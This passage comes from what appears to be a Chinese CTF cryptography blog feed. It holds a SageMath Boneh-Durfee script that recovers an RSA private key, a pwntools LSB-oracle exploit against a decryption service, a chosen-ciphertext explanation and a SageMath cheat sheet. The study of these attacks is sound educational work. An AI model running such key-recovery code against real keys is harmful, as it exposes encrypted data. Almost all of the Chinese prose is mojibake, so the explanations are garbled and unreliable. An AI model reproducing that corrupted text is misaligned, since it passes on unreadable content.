t."</span></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"size det(L) - size e^(m*n) = "</span>, floor(diff)</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>, <span class="number">-1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, \pmodulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"optimizing basis of the lattice via LLL, this can take a long time"</span></span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"LLL is done!"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"looking for independent vectors in the lattice"</span></span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> range(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> range(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> range(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"found them, using vectors"</span>, pol1_idx, <span class="string">"and"</span>, pol2_idx</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"no independant vectors could be found. This should very rarely happen..."</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Your prediction (delta) is too small"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the \pmodulus</span></span><br><span class="line">    N = <span class="number">0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L</span></span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">.18</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span> <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = int((<span class="number">1</span><span class="number">-2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don't touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = int((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"=== checking values ==="</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"* delta:"</span>, delta</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"* delta &lt; 0.292"</span>, delta &lt; <span class="number">0.292</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"* size of e:"</span>, int(log(e)/log(<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"* size of N:"</span>, int(log(N)/log(<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"* m:"</span>, m, <span class="string">", t:"</span>, t</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"=== running algorithm ==="</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"=== solution found ==="</span></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"x:"</span>, solx</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"y:"</span>, soly</span><br><span class="line"></span><br><span class="line">        d = int(pol(solx, soly) / e)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"private key found:"</span>, d</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"=== no solution was found ==="</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"=== %s seconds ==="</span> % (time.time() - start_time))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    example()</span><br></pre></td></tr></table></figure><h2 id="RSA-LSB-Oracle-Attack"><a href="#RSA-LSB-Oracle-Attack" class="headerlink" title="RSA LSB Oracle Attack"></a>RSA LSB Oracle Attack</h2><p>é€‚ç”¨æƒ…å†µï¼šå¯ä»¥é€‰æ‹©å¯†æ–‡å¹¶æ³„éœ²æœ€ä½ä½ã€‚</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ä¸€æ¬¡RSAåŠ å¯†ä¸­ï¼Œæ˜æ–‡ä¸ºmï¼Œæ¨¡æ•°ä¸ºnï¼ŒåŠ å¯†æŒ‡æ•°ä¸ºeï¼Œå¯†æ–‡ä¸ºcã€‚æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºc'=((<span class="number">2</span>^e)*c)%n=((<span class="number">2</span>^e)*(m^e))%n=((<span class="number">2</span>*m)^e)%nï¼Œ å› ä¸ºmçš„ä¸¤å€å¯èƒ½å¤§äºnï¼Œæ‰€ä»¥ç»è¿‡è§£å¯†å¾—åˆ°çš„æ˜æ–‡æ˜¯ m'=(<span class="number">2</span>*m)%n ã€‚æˆ‘ä»¬è¿˜èƒ½å¤ŸçŸ¥é“ m' çš„æœ€ä½ä½lsb æ˜¯<span class="number">1</span>è¿˜æ˜¯<span class="number">0</span>ã€‚ å› ä¸ºnæ˜¯å¥‡æ•°ï¼Œè€Œ<span class="number">2</span>*mæ˜¯å¶æ•°ï¼Œæ‰€ä»¥å¦‚æœlsb æ˜¯<span class="number">0</span>ï¼Œè¯´æ˜(<span class="number">2</span>*m)%n æ˜¯å¶æ•°ï¼Œæ²¡æœ‰è¶…è¿‡nï¼Œå³m&lt;n/<span class="number">2.0</span>ï¼Œåä¹‹åˆ™m&gt;n/<span class="number">2.0</span> ã€‚</span><br><span class="line"></span><br><span class="line">ä¸¾ä¸ªä¾‹å­å°±èƒ½æ˜ç™½<span class="number">2</span>%<span class="number">3</span>=<span class="number">2</span> æ˜¯å¶æ•°ï¼Œè€Œ<span class="number">4</span>%<span class="number">3</span>=<span class="number">1</span> æ˜¯å¥‡æ•°ã€‚ä»¥æ­¤ç±»æ¨ï¼Œæ„é€ å¯†æ–‡c<span class="string">"=(4^e)*c)%n ä½¿å…¶è§£å¯†åä¸ºm"</span>=(<span class="number">4</span>*m)%n ï¼Œåˆ¤æ–­m<span class="string">" çš„å¥‡å¶æ€§å¯ä»¥çŸ¥é“m å’Œ n/4 çš„å¤§å°å…³ç³»ã€‚æ‰€ä»¥æˆ‘ä»¬å°±æœ‰äº†ä¸€ä¸ªäºŒåˆ†ç®—æ³•ï¼Œå¯ä»¥åœ¨å¯¹æ•°æ—¶é—´å†…å°†mçš„èŒƒå›´é€¼è¿‘åˆ°ä¸€ä¸ªè¶³å¤Ÿç‹­çª„çš„ç©ºé—´ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ›´å¤šä¿¡æ¯å¯å‚è€ƒï¼šRSA Least-Significant-Bit Oracle Attack å’Œ RSA least significant bit oracle attack ã€‚</span></span><br></pre></td></tr></table></figure><p>exp:ï¼ˆå¾…éªŒè¯ï¼‰</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">def brute_flag(encrypted_flag, n, e):</span><br><span class="line"></span><br><span class="line">    <span class="attr">flag_count</span> = <span class="attr">n_count</span> = <span class="number">1</span></span><br><span class="line">    <span class="attr">flag_lower_bound</span> = <span class="number">0</span></span><br><span class="line">    <span class="attr">flag_upper_bound</span> = n</span><br><span class="line">    <span class="attr">ciphertext</span> = encrypted_flag</span><br><span class="line">    <span class="attr">mult</span> = <span class="number">1</span></span><br><span class="line">    while flag_upper_bound &gt; flag_lower_bound + <span class="number">1</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">"input your option:"</span>)</span><br><span class="line">        sh.sendline(<span class="string">"D"</span>)</span><br><span class="line">        <span class="attr">ciphertext</span> = (ciphertext * pow(<span class="number">2</span>, e, n)) % n</span><br><span class="line">        flag_count *= <span class="number">2</span></span><br><span class="line">        <span class="attr">n_count</span> = n_count * <span class="number">2</span> - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">"bit = %d"</span> % mult)</span><br><span class="line">        mult += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        sh.recvuntil(<span class="string">"Your encrypted message:"</span>)</span><br><span class="line">        sh.sendline(str(ciphertext))</span><br><span class="line"></span><br><span class="line">        <span class="attr">data=sh.recvline()[:-1]</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="attr">data=='The</span> plain of your decrypted message is even!'):</span><br><span class="line">            <span class="attr">flag_upper_bound</span> = n * n_count / flag_count</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="attr">flag_lower_bound</span> = n * n_count / flag_count</span><br><span class="line">            n_count += <span class="number">1</span></span><br><span class="line">return flag_upper_bound</span><br><span class="line">def main():</span><br><span class="line">    <span class="attr">n</span> = <span class="number">120357855677795403326899325832599223460081551820351966764960386843755808156627131345464795713923271678835256422889567749230248389850643801263972231981347496433824450373318688699355320061986161918732508402417281836789242987168090513784426195519707785324458125521673657185406738054328228404365636320530340758959</span></span><br><span class="line">    <span class="attr">ct</span> = <span class="number">2201077887205099886799419505257984908140690335465327695978150425602737431754769971309809434546937184700758848191008699273369652758836177602723960420562062515168299835193154932988833308912059796574355781073624762083196012981428684386588839182461902362533633141657081892129830969230482783192049720588548332813</span></span><br><span class="line">    print(long_to_bytes(brute_flag(ct, n, <span class="number">65537</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="é€‰æ‹©å¯†æ–‡æ”»å‡»"><a href="#é€‰æ‹©å¯†æ–‡æ”»å‡»" class="headerlink" title="é€‰æ‹©å¯†æ–‡æ”»å‡»"></a>é€‰æ‹©å¯†æ–‡æ”»å‡»</h2><p>é€‚ç”¨æƒ…å†µï¼šå¯ä»¥æ„é€ ä»»æ„å¯†æ–‡å¹¶è·å¾—å¯¹åº”æ˜æ–‡ã€‚</p><p>è¿™ä¸ªå¥½ç†è§£ï¼Œåœ¨ä¸€ä¸ªRSAåŠ å¯†è¿‡ç¨‹ä¸­ï¼Œæ˜æ–‡ä¸ºmï¼Œå¯†æ–‡ä¸ºcï¼Œæ¨¡æ•°ä¸ºnï¼ŒåŠ å¯†æŒ‡æ•°ä¸ºeï¼Œé€‰å–xä»¥æ»¡è¶³gcd(x,n)==1 ä»è€Œä½¿xæ¨¡nçš„é€†å­˜åœ¨ï¼Œæ„é€ å¯†æ–‡câ€™=c*(x^e^) ä½¿è§£å¯†åæ˜æ–‡ä¸ºmâ€™=(m*x)%nï¼Œåˆ™m=mâ€™*x^-1^(\pmod n) ã€‚å¯å‚çœ‹æ¨¡æ„ä¹‰ä¸‹çš„è¿ç®—æ³•åˆ™éƒ¨åˆ†ã€‚(x^-1^=gmpy2.invert(x,n))</p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sageå¸¸ç”¨å‘½ä»¤</title>
      <link href="/2020/05/20/sage%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2020/05/20/sage%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>è¿™é‡Œä¼šè®°å½•ä¸€ç‚¹ç‚¹sageæ¯”è¾ƒå¥½ç”¨çš„å‘½ä»¤ï¼Œç®€æ˜“æ‰‹å†Œ<a href="https://github.com/JayxV/JayxV.github.io/blob/master/2020/05/20/sageå¸¸ç”¨å‘½ä»¤/sagemath.pdf" target="_blank" rel="noopener">åŸæ–‡ä»¶</a>ä¸¢è¿™é‡Œäº†ï¼Œå¹³æ—¶å†é‡åˆ°ä¸€äº›å¥½ç”¨çš„å‘½ä»¤åº”è¯¥è¿˜ä¼šæ›´æ–°ã€‚</p><h2 id="åŸºæœ¬è¯­æ³•ï¼š"><a href="#åŸºæœ¬è¯­æ³•ï¼š" class="headerlink" title="åŸºæœ¬è¯­æ³•ï¼š"></a>åŸºæœ¬è¯­æ³•ï¼š</h2><p>å°†æ•´æ•°è½¬åŒ–ä¸ºäºŒè¿›åˆ¶åˆ—è¡¨</p><p>sage: 10.bits()</p><h2 id="åŸºæœ¬ä»£æ•°"><a href="#åŸºæœ¬ä»£æ•°" class="headerlink" title="åŸºæœ¬ä»£æ•°"></a>åŸºæœ¬ä»£æ•°</h2><p><strong>è§£æ–¹ç¨‹</strong></p><p>solve å‡½æ•°ç”¨äºè§£æ–¹ç¨‹ã€‚è¦ä½¿ç”¨å®ƒï¼Œå…ˆè¦<strong>æŒ‡å®šå˜é‡</strong>ï¼Œç„¶åå°†<strong>æ–¹ç¨‹ï¼ˆæˆ–æ–¹ç¨‹ç»„ï¼‰</strong>ä»¥åŠ<strong>è¦æ±‚è§£çš„å˜é‡</strong>ä½œä¸ºå‚æ•° ä¼ ç»™ solveã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sage</span>: var('x y p q')</span><br><span class="line"><span class="attribute">sage</span>: eq1 = p+q==9 </span><br><span class="line"><span class="attribute">sage</span>: eq2 = q*y+p*x==-6 </span><br><span class="line"><span class="attribute">sage</span>: eq3 = q*yË†2+p*xË†2==24 </span><br><span class="line"><span class="attribute">sage</span>: solve([eq1,eq2,eq3,p==1],p,q,x,y) </span><br><span class="line"></span><br><span class="line">[[p == 1, q == 8, x == -4/3*sqrt(10) - 2/3, y == 1/6*sqrt(2)*sqrt(5) - 2/3], [p == 1, q == 8, x == 4/3*sqrt(10) - 2/3, y == -1/6*sqrt(2)*sqrt(5) - 2/3]]</span><br><span class="line"></span><br><span class="line">è¦æ±‚è§£çš„è¿‘ä¼¼å€¼ï¼Œå¯ä»¥è¿™æ ·ï¼š</span><br><span class="line"><span class="attribute">sage</span>: solns = solve([eq1,eq2,eq3,p==1],p,q,x,y, solution dict=True) </span><br><span class="line"><span class="attribute">sage</span>: [[s[p].n(30), s[q].n(30), s[x].n(30), s[y].n(30)] for s in solns] </span><br><span class="line"></span><br><span class="line">[[1.0000000, 8.0000000, -4.8830369, -0.13962039], [1.0000000, 8.0000000, 3.5497035, -1.1937129]]</span><br></pre></td></tr></table></figure><p><strong>æ±‚è§£æ–¹ç¨‹çš„æ•°å€¼è§£</strong></p><p>ç”¨ find root åœ¨åŒºé—´ 0 &lt; Ï• &lt; Ï€/2 ä¸Šå¯»æ‰¾ä¸Šè¿°æ–¹ç¨‹çš„è§£ã€‚</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sa<span class="symbol">ge:</span> <span class="built_in">phi</span> = <span class="built_in">var</span>('<span class="built_in">phi</span>') </span><br><span class="line">sa<span class="symbol">ge:</span> <span class="built_in">find</span> root(<span class="built_in">cos</span>(<span class="built_in">phi</span>)==<span class="built_in">sin</span>(<span class="built_in">phi</span>),<span class="number">0</span>,<span class="built_in">pi</span>/<span class="number">2</span>) </span><br><span class="line"></span><br><span class="line"><span class="number">0.785398163397448</span>..</span><br></pre></td></tr></table></figure><h2 id="åŸºæœ¬çš„ç¯"><a href="#åŸºæœ¬çš„ç¯" class="headerlink" title="åŸºæœ¬çš„ç¯"></a>åŸºæœ¬çš„ç¯</h2><p>â€¢ æ•´æ•°ç¯ {â€¦,âˆ’1,0,1,2,â€¦}, Sage ä¸­å« ZZ; </p><p>â€¢ æœ‰ç†æ•°ç¯ ï¼Œå³æ•´æ•°æ„æˆçš„åˆ†æ•°ï¼ŒSage ä¸­å« QQ; </p><p>â€¢ å®æ•°ç¯ï¼ŒSage ä¸­å« RR;</p><p>â€¢ å¤æ•°ç¯ï¼ŒSage ä¸­å« CCï¼›</p><p>sage: ratpoly.&lt;t&gt; = PolynomialRing(QQ) </p><p>ratpolyæ˜¯é›†åˆçš„åå­—ï¼Œè‡ªå·±å®šä¹‰</p><p>.&lt;t&gt;æ˜¯å˜é‡çš„åå­—ï¼Œè‡ªå·±å®šä¹‰</p><p>PolynomialRing()æ˜¯ç¯</p><p>QQæ˜¯æœ‰ç†æ•°ç¯</p><p>æœ‰é™åŸŸè¿˜æœ‰ï¼ŒGF(2)ã€GF(2^8,modulus=[1,0,0,1,1,1,0,0,1]) â€¦â€¦</p><h2 id="çº¿æ€§ä»£æ•°"><a href="#çº¿æ€§ä»£æ•°" class="headerlink" title="çº¿æ€§ä»£æ•°"></a>çº¿æ€§ä»£æ•°</h2><p>ä½¿ç”¨æ–¹æ³• solve right. æ‰§è¡Œ A.solve right(Y) è¿”å›ä¸€ä¸ªçŸ©é˜µï¼ˆæˆ–å‘é‡ï¼‰X æ»¡ è¶³ AX = Y:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sage</span>: A = Matrix([[1,2,3],[3,2,1],[1,1,1]]) </span><br><span class="line"><span class="attribute">sage</span>: Y = vector([0, -4, -1]) </span><br><span class="line"><span class="attribute">sage</span>: X = A.solve_right(Y) </span><br><span class="line"></span><br><span class="line">åæ–œæ  \ å¯ä»¥ä»£æ›¿ solve_right; ç”¨ A \ Y ä»£æ›¿ A.solve right(Y).</span><br><span class="line"><span class="attribute">sage</span>: A \ Y</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼çš„ï¼Œä½¿ç”¨ A.solve left(Y) æ±‚è§£æ»¡è¶³ XA = Y çš„ X. </p><p>çŸ©é˜µæ‰€åœ¨çš„ç¯å½±å“å®ƒçš„æ€§è´¨ã€‚</p><p>matrix å‘½ä»¤ä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°å‘Šè¯‰ Sage è¿™ä¸ªçŸ©é˜µ æ˜¯æ•´æ•°ç¯ (ZZ) ä¸Šçš„ï¼Œæœ‰ç†æ•°ç¯ (QQ) ä¸Šçš„ï¼Œè¿˜æ˜¯å®æ•°ç¯ (RR) ä¸Šçš„:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sage: AZ = matrix(ZZ, <span class="string">[[2,0], [0,1]]</span>) </span><br><span class="line">sage: AQ = matrix(QQ, <span class="string">[[2,0], [0,1]]</span>) </span><br><span class="line">sage: AR = matrix(RR, <span class="string">[[2,0], [0,1]]</span>)</span><br></pre></td></tr></table></figure><p>æ–°å»ºä¸€ä¸ª3*3çš„çŸ©é˜µA</p><p>sage: A = Matrix(3,range(9))     </p><p>Açš„é˜¶æ¢¯å½¢å¼</p><p>sage: A.echelon form() </p><p>Açš„è½¬ç½®çŸ©é˜µ</p><p>sage: A.T == A.transpose()</p><p>Açš„è¡Œå‘é‡</p><p>sage: A.rows()</p><p>Açš„åˆ—å‘é‡</p><p>sage: A.columns()</p><h2 id="å¤šé¡¹å¼"><a href="#å¤šé¡¹å¼" class="headerlink" title="å¤šé¡¹å¼"></a>å¤šé¡¹å¼</h2><h3 id="ä¸€å…ƒå¤šé¡¹å¼"><a href="#ä¸€å…ƒå¤šé¡¹å¼" class="headerlink" title="ä¸€å…ƒå¤šé¡¹å¼"></a>ä¸€å…ƒå¤šé¡¹å¼</h3><p>ä¸‰ç§æ–¹å¼åˆ›å»ºå¤šé¡¹å¼ç¯</p><p>sage: R = PolynomialRing(QQ, â€˜tâ€™) </p><p>sage: R = QQ[â€˜tâ€™] </p><p>sage: R.&lt;t&gt; = PolynomialRing(QQ)     or     sage: R.&lt;t&gt; = QQ[â€˜tâ€™]    or     R.&lt;t&gt; = QQ[] </p><p>eg:</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sa<span class="symbol">ge:</span> R.&lt;<span class="built_in">t</span>&gt; = QQ[]</span><br><span class="line">sa<span class="symbol">ge:</span> f = <span class="number">2</span>*<span class="built_in">t</span>^<span class="number">7</span> +<span class="number">3</span>*<span class="built_in">t</span>^<span class="number">2</span> -<span class="number">15</span>/<span class="number">19</span></span><br><span class="line">sa<span class="symbol">ge:</span> f^<span class="number">2</span></span><br><span class="line"><span class="number">4</span>*<span class="built_in">t</span>^<span class="number">14</span> + <span class="number">12</span>*<span class="built_in">t</span>^<span class="number">9</span> - <span class="number">60</span>/<span class="number">19</span>*<span class="built_in">t</span>^<span class="number">7</span> + <span class="number">9</span>*<span class="built_in">t</span>^<span class="number">4</span> - <span class="number">90</span>/<span class="number">19</span>*<span class="built_in">t</span>^<span class="number">2</span> + <span class="number">225</span>/<span class="number">361</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆéšæœºå¤šé¡¹å¼</p><p>sage: R.&lt;y&gt; = PolynomialRing(GF(p))</p><p>sage: S = R.random_element(degree)</p><p>æ£€æµ‹å¤šé¡¹å¼æ˜¯å¦ä¸å¯çº¦ï¼š</p><p>sage: S.is_irreduceible()</p><p>(æŠŠå¤šé¡¹å¼æ¯ä¸€é¡¹çš„æ¨¡æ•°ç”±pè½¬å˜ä¸ºSå¯¹åº”é¡¹çš„ç³»æ•°)</p><p>sage: Rs = R.quotient(S)</p><p>å°†æ•´æ•°åˆ—è¡¨è½¬ä¸ºå¤šé¡¹å¼å¯¹åº”é¡¹çš„ç³»æ•°ï¼Œ</p><p>sage: RS([111,111])</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">F.&lt;x&gt; = GF(<span class="number">2</span>^<span class="number">8</span>,modulus=[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]) #æ„Ÿè§‰é‚£ä¸ªPolymonialRingéƒ½ä¸ç”¨å†™äº†</span><br><span class="line">F.fetch_int(<span class="number">21</span>) == F(<span class="number">21.</span>bits())</span><br><span class="line">F(<span class="number">21.</span>bits()).integer_representation()#é€†è¿‡ç¨‹</span><br></pre></td></tr></table></figure><h3 id="å¤šå…ƒå¤šé¡¹å¼"><a href="#å¤šå…ƒå¤šé¡¹å¼" class="headerlink" title="å¤šå…ƒå¤šé¡¹å¼"></a>å¤šå…ƒå¤šé¡¹å¼</h3><p>è·Ÿå®šä¹‰ä¸€å…ƒå¤šé¡¹å¼ä¸€æ ·ï¼Œå®šä¹‰å¤šå…ƒå¤šé¡¹å¼ä¹Ÿæœ‰å¤šç§æ–¹æ³•ï¼š</p><p>sage: GF(5)[â€˜z0, z1, z2â€™] </p><p>sage: R.&lt;z0,z1,z2&gt; = GF(5)[];</p><p>sage: 